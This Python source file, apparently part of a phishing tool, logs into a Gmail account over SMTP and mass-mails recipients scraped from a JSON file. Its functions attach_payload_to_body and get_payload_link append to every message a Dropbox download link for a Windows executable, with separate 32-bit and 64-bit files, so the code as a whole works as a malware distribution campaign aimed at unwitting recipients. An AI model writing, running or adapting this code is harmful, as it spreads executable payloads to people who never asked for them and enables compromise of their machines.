import smtplib

from backend.email_scrapper.email_scrapper_service import extract_data_from_json


def send_emails(arguments):
    user = arguments.split('~')[0]
    password = arguments.split('~')[2]
    path = arguments.split('~')[3]
    subject = arguments.split('~')[4]
    body = arguments.split('~')[5]
    option = arguments.split('~')[6]
    to = ''
    gmail_user = user
    gmail_password = password
    if arguments.split('~')[7] != '' and arguments.split('~')[3] == '':
        to = arguments.split('~')[7]
    elif arguments.split('~')[3] != '':
        to = extract_data_from_json(path)['emails']

    sent_from = gmail_user
    SUBJECT = subject

    TEXT = body
    message = 'Subject: {}\n\n{}'.format(SUBJECT, TEXT)
    message = attach_payload_to_body(message,get_payload_link(option))
    try:
        smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        smtp_server.ehlo()
        smtp_server.login(gmail_user, gmail_password)
        smtp_server.sendmail(sent_from, to, message)
        smtp_server.close()
        return "Emails were sent succesfully"
    except Exception as ex:
        return str(ex)

def attach_payload_to_body(body, payload_link):

    return body +"\n"+payload_link


def get_payload_link(option):
    url = ''
    if option == '64':
        url = 'https://www.dropbox.com/s/qfx3ddgs96ofgge/file64b.exe?dl=1'
    if option == '32':
        url = 'https://www.dropbox.com/s/t750z0u9z7tfu0o/file.exe?dl=1'
    return url
